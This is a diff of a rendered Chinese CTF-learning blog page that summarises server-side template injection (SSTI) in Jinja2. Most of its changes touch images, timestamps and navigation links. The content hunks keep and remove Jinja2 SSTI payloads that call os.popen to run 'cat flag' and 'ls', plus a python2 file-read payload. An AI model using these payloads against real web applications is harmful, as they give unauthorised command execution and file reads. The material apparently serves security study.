@@ -102,12 +102,12 @@ SSTI总结 |
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeun65urj20zk0m81ii.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipexbei4hj20zk0m8npd.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipewr8iypj20zk0m8b29.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giciuja1j1j20zk0m8kjl.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicljitigmj20zk0m87fp.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclx6phq6j20zk0m8e36.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclimtf7dj20zk0m8qav.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicitht3xtj20zk0m8k5v.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph4baakhj20zk0m8h5q.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipexw3o58j20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclga70tsj20zk0m84mr.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipevo9j1jj20zk0m8e81.jpg"></li>
         </ul>
       </div>
     </header>
@@ -211,16 +211,9 @@ os.popen () 方法用于从一个命令打开一个管道。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__.__getitem__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`&#123;&#123;a.__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;`</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for i in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__==&#x27;Popen&#x27; %&#125;&#123;&#123; i.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一些过滤绕过:</span><br><span class="line">[PYTHON SSTI的一些BYPASS - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/347865.html)</span><br><span class="line">[CTF 对SSTI的一些总结 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/328222.html)</span><br></pre></td></tr></table></figure>
-<h2 id="ssti-labs"><a class="markdownIt-Anchor" href="#ssti-labs">#</a> ssti-labs</h2>
-<ol>
-<li></li>
-</ol>
-<p>payload1:(用常规方法找 shell 类)<br>
-(1) 先用脚本找包含 builtins 的类：128,129,130…<br>
-<mark>python3</mark></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[128].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python2,有file类</span><br><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[40](&#x27;flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<p>2. 过滤了 ``</p>
+<p>参考:<br>
+<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8zNDc4NjUuaHRtbA==">PYTHON SSTI 的一些 BYPASS - FreeBuf 网络安全行业门户</span><br>
+<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzMyODIyMi5odG1s"> CTF 对 SSTI 的一些总结 - FreeBuf 网络安全行业门户</span></p>
 
   </div>
 
@@ -232,7 +225,7 @@ os.popen () 方法用于从一个命令打开一个管道。</p>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-05-02 12:14:03" itemprop="dateModified" datetime="2023-05-02T12:14:03+08:00">2023-05-02</time>
+    <time title="修改时间：2023-05-02 12:25:07" itemprop="dateModified" datetime="2023-05-02T12:25:07+08:00">2023-05-02</time>
   </span>
 </div>
 
@@ -264,7 +257,7 @@ os.popen () 方法用于从一个命令打开一个管道。</p>
     <div class="item left">
       
 
-  <a href="/2023/04/30/SSRF/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclh3brzpj20zk0m8ann.jpg" title="SSRF绕过">
+  <a href="/2023/04/30/SSRF/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeyhsblkj20zk0m81kx.jpg" title="SSRF绕过">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> </span>
   <h3>SSRF绕过</h3>
@@ -272,6 +265,14 @@ os.popen () 方法用于从一个命令打开一个管道。</p>
 
     </div>
     <div class="item right">
+      
+
+  <a href="/2023/05/02/ssti-labs/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipey0a334j20zk0m8qpt.jpg" title="SSTI-Labs">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>SSTI-Labs</h3>
+  </a>
+
     </div>
 </div>
 
@@ -288,7 +289,7 @@ os.popen () 方法用于从一个命令打开一个管道。</p>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="文章目录">
-          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%9F%A5%E6%89%BE%E5%B9%B6%E4%B8%94%E4%BD%BF%E7%94%A8shell%E7%B1%BB%E6%89%BE%E5%90%8D%E5%AD%97%E5%92%8C%E8%84%9A%E6%9C%AC%E4%BB%A3%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text"> 怎么查找并且使用 shell 类：找名字和脚本代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E6%9C%80%E7%AC%A8%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text"> 一。最笨的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E5%92%8C%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 查看内置函数和对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#os%E7%B1%BBbuiltins%E7%B1%BB%E6%9F%A5%E6%89%BE"><span class="toc-number">1.1.3.</span> <span class="toc-text"> os 类，builtins 类查找</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#builtins%E6%A8%A1%E6%9D%BF%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.4.</span> <span class="toc-text"> builtins 模板利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#os%E6%A8%A1%E5%9D%97%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.5.</span> <span class="toc-text"> os 模块利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1lipsum%E5%86%85%E7%BD%AEos"><span class="toc-number">1.1.5.1.</span> <span class="toc-text"> 1.lipsum 内置 os</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2url_for%E8%B0%83%E7%94%A8os"><span class="toc-number">1.1.5.2.</span> <span class="toc-text"> 2.url_for 调用 os</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E5%B7%B2%E5%8A%A0%E8%BD%BD%E7%9A%84os%E6%A8%A1%E5%9D%97%E7%9A%84%E5%AD%90%E7%B1%BB%E9%87%8C%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8os%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.5.3.</span> <span class="toc-text"> 3. 已加载的 os 模块的子类里直接调用 os 模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E4%BD%BF%E7%94%A8load_module%E5%8A%A0%E8%BD%BDos"><span class="toc-number">1.1.5.4.</span> <span class="toc-text"> 4. 第三方库，使用 load_module 加载 os</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linecache%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.6.</span> <span class="toc-text"> linecache 函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#subprocesspopen%E7%B1%BB"><span class="toc-number">1.1.6.1.</span> <span class="toc-text"> subprocess.Popen 类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jinjia%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text"> jinjia 格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3python%E7%9A%84%E5%87%A0%E4%B8%AA%E5%87%BD%E6%95%B0%E8%A7%A3%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text"> 了解 python 的几个函数解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81payload"><span class="toc-number">2.</span> <span class="toc-text"> 常见 payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti-labs"><span class="toc-number">3.</span> <span class="toc-text"> ssti-labs</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%9F%A5%E6%89%BE%E5%B9%B6%E4%B8%94%E4%BD%BF%E7%94%A8shell%E7%B1%BB%E6%89%BE%E5%90%8D%E5%AD%97%E5%92%8C%E8%84%9A%E6%9C%AC%E4%BB%A3%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text"> 怎么查找并且使用 shell 类：找名字和脚本代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E6%9C%80%E7%AC%A8%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text"> 一。最笨的方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E5%92%8C%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 查看内置函数和对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#os%E7%B1%BBbuiltins%E7%B1%BB%E6%9F%A5%E6%89%BE"><span class="toc-number">1.1.3.</span> <span class="toc-text"> os 类，builtins 类查找</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#builtins%E6%A8%A1%E6%9D%BF%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.4.</span> <span class="toc-text"> builtins 模板利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#os%E6%A8%A1%E5%9D%97%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.5.</span> <span class="toc-text"> os 模块利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1lipsum%E5%86%85%E7%BD%AEos"><span class="toc-number">1.1.5.1.</span> <span class="toc-text"> 1.lipsum 内置 os</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2url_for%E8%B0%83%E7%94%A8os"><span class="toc-number">1.1.5.2.</span> <span class="toc-text"> 2.url_for 调用 os</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3%E5%B7%B2%E5%8A%A0%E8%BD%BD%E7%9A%84os%E6%A8%A1%E5%9D%97%E7%9A%84%E5%AD%90%E7%B1%BB%E9%87%8C%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8os%E6%A8%A1%E5%9D%97"><span class="toc-number">1.1.5.3.</span> <span class="toc-text"> 3. 已加载的 os 模块的子类里直接调用 os 模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E4%BD%BF%E7%94%A8load_module%E5%8A%A0%E8%BD%BDos"><span class="toc-number">1.1.5.4.</span> <span class="toc-text"> 4. 第三方库，使用 load_module 加载 os</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linecache%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.6.</span> <span class="toc-text"> linecache 函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#subprocesspopen%E7%B1%BB"><span class="toc-number">1.1.6.1.</span> <span class="toc-text"> subprocess.Popen 类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jinjia%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text"> jinjia 格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%86%E8%A7%A3python%E7%9A%84%E5%87%A0%E4%B8%AA%E5%87%BD%E6%95%B0%E8%A7%A3%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text"> 了解 python 的几个函数解析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81payload"><span class="toc-number">2.</span> <span class="toc-text"> 常见 payload</span></a></li></ol>
       </div>
       <div class="related panel pjax" data-title="系列文章">
       </div>
@@ -303,7 +304,7 @@ os.popen () 方法用于从一个命令打开一个管道。</p>
 <nav class="state">
     <div class="item posts">
       <a href="/archives/">
-        <span class="count">14</span>
+        <span class="count">15</span>
         <span class="name">文章</span>
       </a>
     </div>
@@ -355,10 +356,12 @@ os.popen () 方法用于从一个命令打开一个管道。</p>
 
   <ul id="quick">
     <li class="prev pjax">
+        <a href="/2023/04/30/SSRF/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
     </li>
     <li class="up"><i class="ic i-arrow-up"></i></li>
     <li class="down"><i class="ic i-arrow-down"></i></li>
     <li class="next pjax">
+        <a href="/2023/05/02/ssti-labs/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
     </li>
     <li class="percent"></li>
   </ul>
@@ -382,7 +385,7 @@ os.popen () 方法用于从一个命令打开一个管道。</p>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/28/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="命令执行漏洞及绕过方法">命令执行漏洞及绕过方法</a></span>
+    <span><a href="/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含及伪协议的使用">文件包含及伪协议的使用</a></span>
   </li>
 
       
@@ -400,7 +403,7 @@ os.popen () 方法用于从一个命令打开一个管道。</p>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="正则表达式">正则表达式</a></span>
+    <span><a href="/2023/04/27/unserialize-labs/" title="Unserialize-labs">Unserialize-labs</a></span>
   </li>
 
       
@@ -409,7 +412,7 @@ os.popen () 方法用于从一个命令打开一个管道。</p>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/27/unserialize-labs/" title="Unserialize-labs">Unserialize-labs</a></span>
+    <span><a href="/2023/05/02/ssti-labs/" title="SSTI-Labs">SSTI-Labs</a></span>
   </li>
 
       
@@ -427,7 +430,7 @@ os.popen () 方法用于从一个命令打开一个管道。</p>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/" title="无字母数字rce">无字母数字rce</a></span>
+    <span><a href="/2023/04/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="php反序列化漏洞学习">php反序列化漏洞学习</a></span>
   </li>
 
       
@@ -436,16 +439,7 @@ os.popen () 方法用于从一个命令打开一个管道。</p>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含及伪协议的使用">文件包含及伪协议的使用</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2023/04/30/SSRF/" title="SSRF绕过">SSRF绕过</a></span>
+    <span><a href="/2023/04/24/sqli-labs/" title="Sqli-labs靶场通关">Sqli-labs靶场通关</a></span>
   </li>
 
       
@@ -463,7 +457,16 @@ os.popen () 方法用于从一个命令打开一个管道。</p>
 <div class="breadcrumb">
 </div>
 
-    <span><a href="/2023/04/26/nessctf/" title="NSSCTF精选">NSSCTF精选</a></span>
+    <span><a href="/2023/04/30/SSRF/" title="SSRF绕过">SSRF绕过</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/27/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" title="正则表达式">正则表达式</a></span>
   </li>
 
   </ul>
